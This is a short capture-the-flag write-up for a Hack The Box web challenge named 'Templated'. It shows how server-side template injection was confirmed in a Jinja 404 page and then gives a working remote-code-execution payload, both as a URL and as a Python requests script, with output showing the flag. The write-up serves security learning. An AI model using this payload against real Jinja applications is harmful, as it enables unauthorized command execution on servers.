# Templated
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/aba87051-5004-4d60-890d-df0c00ff4308)

## Desciption
Can you exploit this simple mistake?

## Solution
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/a12def89-9cbe-403c-86b0-93b5065d84d1)
From the interface, it can be seen that the web application uses Jinja.

My idea is to perform Remote Code Execution (RCE) using the common Server-Side Template Injection (SSTI) vulnerability in Jinja.

When accessing a non-existent path, the web application responds with a notification.

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/7f440ad8-9a43-4645-b3fc-60ad1601d18e)

I tried the payload "7*7" and received the result "49".

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/b4135f45-d96f-4707-85dd-82687b1eef52)

you can refer to some commonly used payloads for Jinja SSTI vulnerabilities [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md):

My payload: `http://143.110.169.131:31927/{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}`

Script python:
```python=
import requests

url = "http://143.110.169.131:31927/"

payload = "{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}"

r = requests.get(url + payload)

print(r.text)
```
Output:
```
┌──(taiwhis㉿kali)-[~]
└─$ python 6.py

<h1>Error 404</h1>
<p>The page '<str>HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}
</str>' could not be found</p>
```

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/9f7a11c9-b246-4b99-8c17-b8f7ed3950b1)

